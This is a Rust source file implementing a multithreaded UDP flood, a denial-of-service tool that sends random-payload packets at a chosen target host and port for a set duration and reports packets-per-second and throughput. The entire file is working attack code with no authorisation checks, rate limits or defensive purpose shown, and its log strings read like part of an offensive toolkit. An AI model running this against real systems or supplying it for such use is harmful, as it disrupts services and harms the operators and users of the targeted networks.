use std::collections::HashMap;
use std::net::UdpSocket;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use rand::Rng;

/// Maximum UDP payload size (65535 - 20 IP header - 8 UDP header).
const MAX_PAYLOAD_SIZE: usize = 65507;

/// Default payload size per packet.
const DEFAULT_PAYLOAD_SIZE: usize = 1024;

pub struct UdpFlood {
    target: String,
    duration: u64,
    threads: u32,
    port: u16,
    payload_size: usize,
    stop_flag: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    callback: Arc<dyn Fn(&str) + Send + Sync>,
}

impl UdpFlood {
    pub fn new(
        target: String,
        duration: u64,
        threads: u32,
        port: u16,
        callback: Arc<dyn Fn(&str) + Send + Sync>,
    ) -> Self {
        Self {
            target,
            duration,
            threads,
            port,
            payload_size: DEFAULT_PAYLOAD_SIZE,
            stop_flag: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            callback,
        }
    }

    #[allow(dead_code)]
    pub fn with_payload_size(mut self, size: usize) -> Self {
        self.payload_size = size.min(MAX_PAYLOAD_SIZE);
        self
    }

    pub fn stop(&self) {
        self.stop_flag.store(true, Ordering::SeqCst);
    }

    pub fn run(&self) -> HashMap<String, String> {
        let addr = format!("{}:{}", self.target, self.port);

        (self.callback)(&format!(
            "[*] Launching UDP Flood on {} with {} threads for {}s (payload: {} bytes)",
            addr, self.threads, self.duration, self.payload_size
        ));

        let start = Instant::now();
        let dur = Duration::from_secs(self.duration);
        let mut handles = Vec::new();

        for _ in 0..self.threads {
            let stop = self.stop_flag.clone();
            let pkts = self.packets_sent.clone();
            let bytes = self.bytes_sent.clone();
            let target = addr.clone();
            let psize = self.payload_size;

            let handle = std::thread::spawn(move || {
                let socket = match UdpSocket::bind("0.0.0.0:0") {
                    Ok(s) => s,
                    Err(_) => return,
                };
                // Non-blocking not required; sends are fast for UDP

                let mut rng = rand::thread_rng();
                let mut buf = vec![0u8; psize];

                while !stop.load(Ordering::Relaxed) && start.elapsed() < dur {
                    // Fill buffer with random data
                    rng.fill(&mut buf[..]);

                    match socket.send_to(&buf, &target) {
                        Ok(n) => {
                            pkts.fetch_add(1, Ordering::Relaxed);
                            bytes.fetch_add(n as u64, Ordering::Relaxed);
                        }
                        Err(_) => {
                            // Send failed, continue
                        }
                    }
                }
            });
            handles.push(handle);
        }

        // Stats reporting thread
        let stop_s = self.stop_flag.clone();
        let pkts_s = self.packets_sent.clone();
        let bytes_s = self.bytes_sent.clone();
        let cb_s = self.callback.clone();

        let stats_handle = std::thread::spawn(move || {
            while !stop_s.load(Ordering::Relaxed) && start.elapsed() < dur {
                std::thread::sleep(Duration::from_secs(1));
                let p = pkts_s.load(Ordering::Relaxed);
                let b = bytes_s.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();
                let pps = if elapsed > 0 { p / elapsed } else { p };
                let mbps = if elapsed > 0 {
                    (b as f64 / elapsed as f64) / (1024.0 * 1024.0)
                } else {
                    0.0
                };
                cb_s(&format!(
                    "[STATS] Packets: {} | Bytes: {} | PPS: {} | {:.2} MB/s | Elapsed: {}s",
                    p, b, pps, mbps, elapsed
                ));
            }
        });

        for h in handles {
            let _ = h.join();
        }
        self.stop_flag.store(true, Ordering::SeqCst);
        let _ = stats_handle.join();

        let total_pkts = self.packets_sent.load(Ordering::Relaxed);
        let total_bytes = self.bytes_sent.load(Ordering::Relaxed);
        let elapsed = start.elapsed().as_secs_f64();

        let mut stats = HashMap::new();
        stats.insert("packets_sent".into(), total_pkts.to_string());
        stats.insert("bytes_sent".into(), total_bytes.to_string());
        stats.insert("duration".into(), format!("{:.1}s", elapsed));
        stats.insert(
            "pps".into(),
            format!("{:.0}", total_pkts as f64 / elapsed.max(1.0)),
        );
        stats.insert(
            "mbps".into(),
            format!(
                "{:.2}",
                (total_bytes as f64 / elapsed.max(1.0)) / (1024.0 * 1024.0)
            ),
        );
        stats
    }
}
